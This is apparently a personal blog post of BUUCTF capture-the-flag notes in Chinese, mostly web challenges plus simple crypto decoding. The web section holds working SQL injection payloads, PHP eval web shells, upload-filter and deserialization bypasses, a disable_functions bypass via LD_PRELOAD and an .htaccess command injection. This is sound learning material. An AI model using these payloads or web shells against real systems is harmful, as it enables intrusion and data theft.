---
layout: default
title: CTF Learning Challenges Notes
categories:
- Security
tags:
- Security
---
//Description: CTF学习刷题笔记。记录刷题过程中遇到的问题。

//Create Date: 2025-08-13 09:04:20

//Author: channy

[toc]

# 刷 [BUUCTF](https://buuoj.cn/challenges)
使用到的工具：
1. [MD5](https://www.cmd5.com/)

## Basic

### [2019 Havefun](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Havefun)
请求参数`?cat=dog`
### [2019 Knife](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Knife)
AntSword工具直连

### [2019 EasySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]EasySQL)
SQL漏洞，`1' or 1=1#`登录成功
```
GET /check.php?username=1%27+or+1%3D1%23&password=1 HTTP/1.1
```
### [2019 LoveSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]LoveSQL)
sql的select没有group_concat一般只回显一条记录
```sql
username=1&password=2' or 1='1' group by 3#
username=1&password=2%27%20or%201=%271%27%20group%20by%203%23

> Unknown column '4' in 'group statement'

username=1&password=2%27%20union%20select%201,2,3%23
> 2,3
username=1&password=2%27%20union%20select%201,database(),3%23
> geek
username=1&password=2%27%20union%20select%201,group_concat(table_name),3%20from%20mysql.innodb_table_stats%20where%20database_name='geek'%23
> geekuser,l0ve1ysq1
username=1&password=2%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_schema='geek'%20and%20table_name='geekuser'%23
> username,password
> id,username,password (table_name='l0ve1ysq1')
username=1&password=2%27%20union%20select%201,username,password%20from%20geek.geekuser%23
> admin, 251c39b7cef2c57ab4eb885d375d723a
> cl4y, wo_tai_nan_le
username=1&password=2%27%20union%20select%201,2,group_concat(id,username,password)%20from%20geek.l0ve1ysq1%23
```
### [2019 BabySQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BabySQL)
```
GET /check.php?username=admin&password=1'%20order%20by%206%20--%20- HTTP/1.1
> MariaDB server version for the right syntax to use near 'der  6 -- -'' at line 1
GET /check.php?username=admin&password=1'oorr'1'='1'%20--%20- HTTP/1.1
```
过滤了`or`和`by`
```
GET /check.php?username=admin&password=1'union%20select1,2,3%20--%20- HTTP/1.1
> MariaDB server version for the right syntax to use near '1,2,3 -- -'' at line 1
```
过滤了`union`和`select`，尝试带其它关键词的发现也过滤了`where`、`from`、`and`。
```
GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,2,3--%20- HTTP/1.1
> 2, 3
GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,group_concat(table_name),3%20ffromrom%20mysql.innodb_table_stats%20wwherehere%20database_name='geek'--%20- HTTP/1.1
> b4bsql,geekuser
GET /check.php?username=1&password=1'%20uunionnion%20sselectelect%201,group_concat(column_name),3%20ffromrom%20infoorrmation_schema.columns%20wwherehere%20table_schema='geek'%20aandnd%20table_name='geekuser'--%20- HTTP/1.1
> id,username,password (b4bsql同)
......
```
### [2019 HardSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]HardSQL)
报错注入
```
GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,database(),0x7e),1));%23 HTTP/1.1
> XPATH syntax error: '~geek~'
GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(schema_name))from(information_schema.schemata)),0x7e),1));%23 HTTP/1.1
> XPATH syntax error: '~information_schema,performance_'
GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1));%23 HTTP/1.1
> XPATH syntax error: '~H4rDsq1~'
GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1));%23 HTTP/1.1
> XPATH syntax error: '~id,username,password~'
GET /check.php?username=1&password=1'or(updatexml(1,concat(0x7e,(select(group_concat(id,username,password))from(geek.H4rDsq1)),0x7e),1));%23 HTTP/1.1
> XPATH syntax error: '~1flagflag{7acb6ee1-7e45-43ba-95'
GET /check.php?username=1&password=1'or(updatexml(1,right(concat(0x7e,(select(group_concat(password,id))from(geek.H4rDsq1)),0x7e),40),1));%23 HTTP/1.1
> XPATH syntax error: 'ee1-7e45-43ba-9594-00cbbe785abe}'
```
### [2019 FinalSQL](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]FinalSQL)
盲注。。。

### [File](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Secret%20File)
xxx.php后直接接?xxx=，一直写成xxx.php/?xxx=一直没反应到怀疑人生。。。
```
POST /secr3t.php?file=php://filter/read=convert.Base64-encode/resource=flag.php
......
Content-Type: application/x-www-form-urlencoded

<?php phpinfo(); ?>
```
### [Upload](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Upload)
```sh
GIF89a
<?php @eval($_POST['cmd']);?>

# 或
<script language="php">eval($_POST['cmd']);</script>
```
使用`<?xxx`的或后缀`.php`的都上传不成功，拦截`<?`或`php`文件，改用`<script`的和`.phtml`的可以，上传到了upload文件夹下。再用AntSword连接得到flag

### [PHP](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]PHP)
```sh
$ ./dirsearch.py -u http://c65280b2-9099-46ee-8182-3f20914c830c.node5.buuoj.cn:81/ -e "*" --delay 0.1 -t 1 -i 200,403

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, html, htm, js, tar.gz
HTTP method: GET | Threads: 1 | Wordlist size: 15045

Target: http://c65280b2-9099-46ee-8182-3f20914c830c.node5.buuoj.cn:81/

[09:04:13] Scanning: 
[09:25:49] 403 -   327B - /cgi-bin/
[09:30:42] 403 -   325B - /error/
[09:31:49] 200 -     0B - /flag.php
[09:34:17] 200 -    2KB - /index.php
[09:34:19] 200 -   10KB - /index.js
[09:34:23] 200 -    2KB - /index.php/login/
[09:54:16] 200 -    6KB - /www.zip

Task Completed
```
`www.zip`中有源码，序列化题
```php
class Name{
    private $username = 'nonono';
    private $password = 'yesyes';

    public function __construct($username,$password){
        $this->username = $username;
        $this->password = $password;
    }

    function __wakeup(){
        $this->username = 'guest';
    }

    function __destruct(){
        if ($this->password != 100) {
            echo "</br>NO!!!hacker!!!</br>";
            echo "You name is: ";
            echo $this->username;echo "</br>";
            echo "You password is: ";
            echo $this->password;echo "</br>";
            die();
        }
        if ($this->username === 'admin') {
            global $flag;
            echo $flag;
        }else{
            echo "</br>hello my friend~~</br>sorry i can't give you the flag!";
            die();
```
构造
```
<?php
class Name {
        private $username = "admin";
        private $password = 100;
}
$name = new Name('', '');
echo serialize($name);
?>
```
得
```
O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}
```
但需要把"Name":2改成3绕过`__wakeup`，private参数还需要加`%00`，最终得到
```
O:4:"Name":3:{s:14:"%00Name%00username";s:5:"admin";s:14:"%00Name%00password";i:100;} 
```
> 在 PHP 5.6.25 之前和 PHP 7.0.10 之前的版本中，如果序列化字符串中表示的对象属性个数大于实际对象的属性个数，__wakeup() 方法将不会被调用。
### [BuyFlag](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]BuyFlag)
```sh
// BurpSuite
POST /pay.php HTTP/1.1
Host: 0a2058eb-c4f0-41e0-aa41-296633296f34.node5.buuoj.cn:81
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://0a2058eb-c4f0-41e0-aa41-296633296f34.node5.buuoj.cn:81/index.php
Accept-Encoding: gzip, deflate, br
Cookie: user=1
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 35

password=404a&money[]=100000000
```
根据F12的页面提示，改POST，先改user绕过身份验证，再数字改字符和使用数组绕过弱等于验证
### [2019 RCE ME](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]RCE%20ME)
```php
<?php
echo urlencode(~'phpinfo')
?>
```
phpinfo()变成
```
GET /?code=(~%8F%97%8F%96%91%99%90)(); 
```
查看phpinfo返回页面`disable_functions`显示`system`被禁用。构造马
```php
<?php
$a = 'assert'; 
echo urlencode(~$a);
echo ("<p>");
$b = '(eval($_POST[cmd]))';
echo urlencode(~$b)
?>
```
变成
```
GET /?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%9C%92%9B%A2%D6%D6); 
```
用AntSword能够访问成功，看到flag和readflag，下一步需要绕过`disable_functions`被禁函数执行readflag  
LD_PRELOAD预加载.so库以达到覆盖系统函数的目的。  
[bypass_disablefunc_via_LD_PRELOAD](https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD.git)  
```
?code=$_GET['_']($_GET['__']);&_=assert&__=include('/var/tmp/bypass_disablefunc.php')&cmd=/readflag&outpath=/var/tmp/res&sopath=/var/tmp/bypass_disablefunc_x64.so

GET /?code=${~(%A0%B8%BA%AB)}['_'](${~(%A0%B8%BA%AB)}['__']);&_=assert&__=include('/tmp/bypass_disablefunc.php')&cmd=/readflag&outpath=/tmp/res&sopath=/tmp/bypass_disablefunc_x64.so HTTP/1.1
```
### [Roamphp1-Welcome](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Roamphp1-Welcome)
服务器返回405错误，GET改POST加`Content-Type: application/x-www-form-urlencoded`
```
POST /?roam[]=3&roam2[]=4 HTTP/1.1
Host: 7e79b38b-39a6-4210-98c5-9b67a8ef60cc.node5.buuoj.cn:81
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 21

roam1[]=1&roam2[]=2
```
phpinfo()页面中显示有个文件`f1444aagggg.php`访问返回`Flag: SYC{w31c0m3_t0_5yc_r0@m_php1}`但并不是，flag直接放在phpinfo()页面中
```
GET /f1444aagggg.php HTTP/1.1
```
### [Greatphp](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Greatphp)
php中md5和sha1的绕过
```php
<?php
class SYCLOVER {
        public $syc;
        public $lover;
}
// 正则过滤，改用urlencode-decode/xor
$cmd = "/flag";
$cmdencode = urlencode(~$cmd);
echo $cmdencode;
echo "\n";
/* <?= ?> 等同于<?php ?> */
$str = "?><?=include~".urldecode($cmdencode)."?>";
$cls = new SYCLOVER();
// 同一行保证message相同，但类本身因错误码不同而不同
$a = new Error($str, 1);$b = new Error($str, 2); 

$cls->syc = $a; 
$cls->lover = $b; 

echo urlencode(serialize($cls));
?>
```
### [Roamphp2-Myblog](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Roamphp2-Myblog)
```
GET /index.php?page=php://filter/read=convert.Base64-encode/resource=login HTTP/1.1

GET /index.php?page=php://filter/read=convert.Base64-encode/resource=secret HTTP/1.1
```
```php
<?php\nrequire_once("secret.php");\n
mt_srand($secret_seed);\n
$_SESSION[\'password\'] = mt_rand();\n?>\n'

<?php\n$secret_seed = mt_rand();\n?>\n
```
登录失败页面
```
http://c6f1a9dc-119f-4e60-a86d-52adac541ade.node5.buuoj.cn:81/?page=admin/user

GET /index.php?page=php://filter/read=convert.Base64-encode/resource=admin/user HTTP/1.1
```
```php
if (isset($_POST[\'username\']) and isset($_POST[\'password\'])){\n\t
if ($_POST[\'username\'] === "Longlone" and $_POST[\'password\'] == $_SESSION[\'password\']){  // No one knows my password, including 
myself\n\t\t
$logined = true;

<?php
if(isset($_FILES['Files']) and $_SESSION['status'] === true){
    $tmp_file = $_FILES['Files']['name'];
    $tmp_path = $_FILES['Files']['tmp_name'];
    if(($extension = pathinfo($tmp_file)['extension']) != ""){
        $allows = array('gif','jpeg','jpg','png');
        if(in_array($extension,$allows,true) and in_array($_FILES['Files']['type'],array_map(function($ext){return 'image/'.$ext;},$allows),true)){
            $upload_name = sha1(md5(uniqid(microtime(true), true))).'.'.$extension;
            move_uploaded_file($tmp_path,"assets/img/upload/".$upload_name);
            echo "<script>alert('Update image -> assets/img/upload/${upload_name}') </script>";
        } else {
            echo "<script>alert('Update illegal! Only allows like \'gif\', \'jpeg\', \'jpg\', \'png\' ') </script>";
        }
    }
}
?>
```
login页面产生password -> 登录提交SSID、username和password -> 后台对比password -> 提交抓包置空SSID和password绕过  

phpinfo一句话码.php打包成.zip上传访问，zip://bagname#filename流中的文件都会被当成php，但get遇到#会解析故需要转义
```
GET /index.php?page=zip://./assets/img/upload/xxx_uploadname.jpg%23xxx_filename HTTP/1.1
GET /index.php?page=phar://./assets/img/upload/xxx_uploadname.jpg/xxx_filename HTTP/1.1
```
页面均显示空白...  

看了wp都是这个路，但本人尝试多遍均返回空白内容，返回200但Content-Length: 0，暂且记下

### [Cross](https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202020]Cross)
03页面中得到300个随机数

### [easyphp](https://buuoj.cn/challenges#[%E7%BE%8A%E5%9F%8E%E6%9D%AF2020]easyphp)
```sh
GET /?filename=test.php&content=<?php%20@eval($_POST['cmd']);?> HTTP/1.1
```
但访问test.php直接显示内容
```
<?php @eval($_POST['cmd']);?>
Hello, world
```
也就是说，只有index.php能够作为php被解析。采用.htaccess配置auto_prepend_file注入，#(%23)注释，\(%5c)连接，\n(%0a)换行，;(%3b)，?(%3f)，>(%3e)
```sh
php_value auto_prepend_fil\
e .htaccess
#<?php system('cat /fla?'); ?>\

?filename=.htaccess&content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20system('cat%20/fla?')%3B%3F%3E%5C



php_value auto_prepend_fil\
e .htaccess%
#<?php @eval($_POST['cmd']);?>\
Hello, world

?filename=.htaccess&content=php_value%20auto_prepend_fil%5C%0Ae%20.htaccess%0A%23%3C%3Fphp%20@eval($_POST['cmd'])%3B%3F%3E%5C
```

## Crypto
### [1 base64](https://buuoj.cn/challenges#%E4%B8%80%E7%9C%BC%E5%B0%B1%E8%A7%A3%E5%AF%86)
```sh
ZmxhZ3tUSEVfRkxBR19PRl9USElTX1NUUklOR30=
```
### [2 MD5](https://buuoj.cn/challenges#MD5)
```sh
e00cf25ad42683b3df678c61f42c6bda
```
只能暴力短长度的，结果为admin1，算了几分钟。而[cmd5.com](https://www.cmd5.com/)里面秒级别地很快出结果。。。
```py
from hashlib import md5
import string
import itertools

def trysimple(target_md5 = 'e00cf25ad42683b3df678c61f42c6bda', maxlen = 10):
    found = False
    charset = string.digits + string.ascii_lowercase
    for curlen in range(1, maxlen):
        print('curlen = ', curlen)
        for part in itertools.product(charset, repeat=curlen):
            part = ''.join(part)
            part_md5 = md5(part.encode()).hexdigest()
            if part_md5 == target_md5:
                found = True
                break
        if found:
            break
    print(part if found else 'not found!!!')

if __name__ == '__main__':
    trysimple()
```
### [3 URL](https://buuoj.cn/challenges#Url%E7%BC%96%E7%A0%81)
```
%66%6c%61%67%7b%61%6e%64%20%31%3d%31%7d
```
### [4 Char Circle](https://buuoj.cn/challenges#%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2)
根据前四位对应flag推出字母表循环前移13位
```py
import string

content = 'synt{5pq1004q-86n5-46q8-o720-oro5on0417r1}'

# s->f, y->l, n->a, t->g, 
print(ord('s') - ord('f'))
print(ord('y') - ord('l'))
print(ord('n') - ord('a'))
print(ord('t') - ord('g'))
# 13

result = ''
for c in content:
    if c <= 'z' and c >= 'a':
        cord = ord(c)
        n = cord - 13
        if n < ord('a'):
            n += 26
        result += chr(n)
    else:
        result += c
print(result)
```
### [5 Morse Cipher](https://buuoj.cn/challenges#%E6%91%A9%E4%B8%9D)
```
.. .-.. --- ...- . -.-- --- ..-
```
```sh
A: .-    B: -...    C: -.-.    D: -..    E: .    F: ..-.    G: --.    H: ....    I: ..    J: .---    K: -.-    L: .-..    M: --    N: -.    O: ---    P: .--.    Q: --.-    R: .-.    S: ...    T: -    U: ..-    V: ...-    W: .--    X: -..-    Y: -.--    Z: --..
```
### [6 password](https://buuoj.cn/challenges#password)
### [7 Modified Caesar Cipher 变异凯撒](https://buuoj.cn/challenges#%E5%8F%98%E5%BC%82%E5%87%AF%E6%92%92)
Caesar: new = (old + offset) % mod  标准凯撒通常只处理字母  
Modifier Caesar: 每个字母使用不同的offset或不同的原表等...
```py
content = 'afZ_r9VYfScOeO_UL^RWUc'

# a->f, f->l, Z->a, _->g, 
print(ord('a') - ord('f'))
print(ord('f') - ord('l'))
print(ord('Z') - ord('a'))
print(ord('_') - ord('g'))
# -5, -6, -7, -8

result = ''
id = 5
for c in content:
    cord = ord(c)
    n = cord + id
    result += chr(n)
    id += 1
print(result)
```
### [8 Quoted-printable](https://buuoj.cn/challenges#Quoted-printable)
Python 的 quopri 标准库就是专门用来处理 Quoted-printable 编码的
```py
import quopri

encoded_text = "=E9=82=A3=E4=BD=A0=E4=B9=9F=E5=BE=88=E6=A3=92=E5=93=A6"
decoded_bytes = quopri.decodestring(encoded_text)
decoded_text = decoded_bytes.decode('utf-8')
print("解码结果:", decoded_text)
```
### [9](https://buuoj.cn/challenges#%E7%AF%B1%E7%AC%86%E5%A2%99%E7%9A%84%E5%BD%B1%E5%AD%90)
根据前缀发现隔一个字符取一个字符，取完发现`flag{wethinkw`少了后半部分，隔的那些接上。
```py
encoded_text = "felhaagv{ewtehtehfilnakgw}"
pre = ""
last = ""
for idx, c in enumerate(encoded_text):
    if (idx & 1) == 1:
        last += c
    else:
        pre += c
print(pre + last)
```
### [10 Rabbit](https://buuoj.cn/challenges#Rabbit)
